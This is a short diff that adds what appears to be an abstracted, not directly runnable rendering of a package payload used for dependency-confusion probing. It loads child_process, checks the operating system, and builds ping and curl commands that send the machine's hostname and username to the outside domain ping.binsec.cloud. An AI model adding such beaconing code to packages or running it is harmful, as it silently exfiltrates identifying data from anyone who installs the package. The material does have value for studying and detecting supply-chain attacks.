@@ -1,0 +1,7 @@
+var exec = require('child_process').exec
+var os = require('os')
+domain = "ping.binsec.cloud"
+os.type() === 'Linux'
+os.type() === 'Darwin'
+<operator>.formatString("ping -c 1 osx.$(hostname).$(whoami).", domain, "")
+<operator>.formatString("curl https://", domain, "/ping?id=dependencyconfusion-$(hostname).$(whoami)")
